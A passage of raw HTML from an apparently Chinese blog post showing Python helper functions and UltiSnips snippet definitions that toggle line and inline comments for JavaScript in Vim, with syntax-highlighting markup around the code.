class=\"crayon-h\">    </span><span class=\"crayon-st\">else</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">f</span><span class=\"crayon-s\">'{spaces}{START}{line[len(spaces):]}{END}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">line</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">strip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">line </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">line </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">lines</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-21\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># Remove initial indent</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">result</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">initial_indent</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">result</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">result</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">replace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">initial_indent</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-25\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">result</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'\\n'</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">join</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">result</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">else</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-29\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0056 seconds] -->\r\n<p><strong>多行注释：</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6706670a9866190416\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef comment_inline(snip, START=\"/* \", END=\" */\"):\r\n    text = snip.v.text\r\n    lines = text.split('\\n')[:-1]\r\n    first_line = lines[0]\r\n    initial_indent = snip._initial_indent\r\n    spaces = ''\r\n\r\n    # Get the first non-empty line\r\n    for idx, l in enumerate(lines):\r\n        if l.strip() != '':\r\n            first_line = lines[idx]\r\n            sp = re.findall(r'^\\s+', first_line)\r\n            if len(sp):\r\n                spaces = sp[0]\r\n            break            \r\n\r\n    if text.strip().startswith(START):\r\n        result = text.replace(START, '', 1).replace(END, '', 1)\r\n    else:\r\n        result = text.replace(spaces, spaces + START, 1).rstrip('\\n') + END + '\\n'\r\n\r\n    if initial_indent:\r\n        result = result.replace(initial_indent, '', 1)\r\n\r\n    return result</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a9866190416-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a9866190416-25\">25</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">comment_inline</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">START</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"/* \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">END</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\" */\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">text</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">text</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-3\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">lines</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">text</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">split</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'\\n'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">first_line</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lines</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">initial_indent</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_initial_indent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-6\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">spaces</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># Get the first non-empty line</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">enumerate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">lines</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">l</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">strip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-11\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">first_line</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lines</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">sp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">re</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">findall</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">r</span><span class=\"crayon-s\">'^\\s+'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">first_line</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-13\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-14\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">spaces</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sp</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-15\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">break</span><span class=\"crayon-h\">            </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-16\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">text</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">strip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">startswith</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">START</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">text</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">replace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">START</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">replace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-st\">END</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">else</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">text</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">replace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">spaces</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">spaces</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">START</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">rstrip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'\\n'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">END</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'\\n'</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-21\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">initial_indent</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">result</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">replace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">initial_indent</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a9866190416-24\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6706670a9866190416-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">result</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0049 seconds] -->\r\n<p><strong>代码片段定义：</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6706670ad416700164\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nglobal !p\r\nfrom javascript_snippets import (\r\n\tcomment, comment_inline\r\n)\r\nendglobal\r\n\r\n# ...\r\n\r\nsnippet c \"Toggle comment every single line\"\r\n`!p\r\nsnip.rv = comment(snip, START='// ', END='')\r\n`$0\r\nendsnippet\r\n\r\nsnippet ci \"Toggle comment inline.\"\r\n`!p\r\nsnip.rv = comment_inline(snip, START=\"/* \", END=\" */\")\r\n`$0\r\nendsnippet</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6706670ad416700164-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670ad416700164-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670ad416700164-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670ad416700164-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670ad416700164-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670ad416700164-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670ad416700164-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670ad416700164-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670ad416700164-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670ad416700164-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670ad416700164-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670ad416700164-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670ad416700164-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670ad416700164-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670ad416700164-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670ad416700164-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670ad416700164-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670ad416700164-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670ad416700164-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6706670ad416700164-1\"><span class=\"crayon-m\">global</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!</span><span class=\"crayon-i\">p</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670ad416700164-2\"><span class=\"crayon-e\">from </span><span class=\"crayon-e\">javascript_snippets </span><span class=\"crayon-e\">import</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670ad416700164-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">comment</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">comment</span><span class=\"crayon-sy\">_</span>inline</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670ad416700164-4\"><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670ad416700164-5\"><span class=\"crayon-v\">endglobal</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670ad416700164-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6706670ad416700164-7\"><span class=\"crayon-p\"># ...</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670ad416700164-8\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6706670ad416700164-9\"><span class=\"crayon-i\">snippet</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Toggle comment every single line\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670ad416700164-10\"><span class=\"crayon-sy\">`</span><span class=\"crayon-o\">!</span><span class=\"crayon-i\">p</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670ad416700164-11\"><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">comment</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">START</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'// '</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">END</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">''</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670ad416700164-12\"><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670ad416700164-13\"><span class=\"crayon-e\">endsnippet</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670ad416700164-14\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6706670ad416700164-15\"><span class=\"crayon-e\">snippet </span><span class=\"crayon-i\">ci</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Toggle comment inline.\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670ad416700164-16\"><span class=\"crayon-sy\">`</span><span class=\"crayon-o\">!</span><span class=\"crayon-i\">p</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670ad416700164-17\"><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">comment_inline</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">START</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"/* \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">END</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\" */\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670ad416700164-18\"><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670ad416700164-19\"><span class=\"crayon-v\">endsnippet</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p>动图演示</p>\n<p><img src=\"//img30.360buyimg.com/devfe/jfs/t24175/330/2554434390/319822/5d8cf724/5b850d67N4c475946.gif\" alt=\"python-snippets-to-comment\"></p>\n<p>不同的语言可以在对应的片段文件中定义并传入注释符号参数即可，有了这个功能就可以愉快的删除其它的 vim 注释插件了 😀</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114334\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114334votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114334\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: 